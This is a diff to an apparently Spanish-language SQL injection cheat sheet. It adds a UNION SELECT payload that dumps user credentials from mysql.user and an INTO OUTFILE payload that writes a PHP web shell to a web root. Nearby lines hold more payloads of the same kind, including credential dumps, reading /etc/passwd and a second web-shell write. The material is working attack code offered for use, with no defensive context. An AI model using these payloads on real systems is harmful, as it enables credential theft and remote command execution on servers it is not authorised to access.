@@ -63,6 +63,7 @@ UNION SELECT NULL,username,NULL from users-- -
 UNION SELECT NULL,password,NULL from users#
 UNION SELECT NULL,concat(Username,0x3a,Password),NULL from Colegio.Users-- -
 UNION SELECT NULL,concat(Username,0x3a,Password),NULL from Colegio.Users#
+UNION SELECT 1,concat(User,0x3a,Password),3,4 from mysql.user-- -
 ```
 ## Leyendo Archivos
 ```sql
@@ -72,4 +73,5 @@ UNION SELECT NULL,load_file('/etc/passwd'),NULL#
 ## Escribiendo Archivos
 ```sql
 ' union select ("<?php system($_GET['cmd']) ?>") into outfile "C:/xampp/htdocs/shell.php"-- -
+' union select 1,("<?php system($_GET['cmd']) ?>"),3,4 into outfile "/var/www/html/SQL/shell.php"-- -
 ```
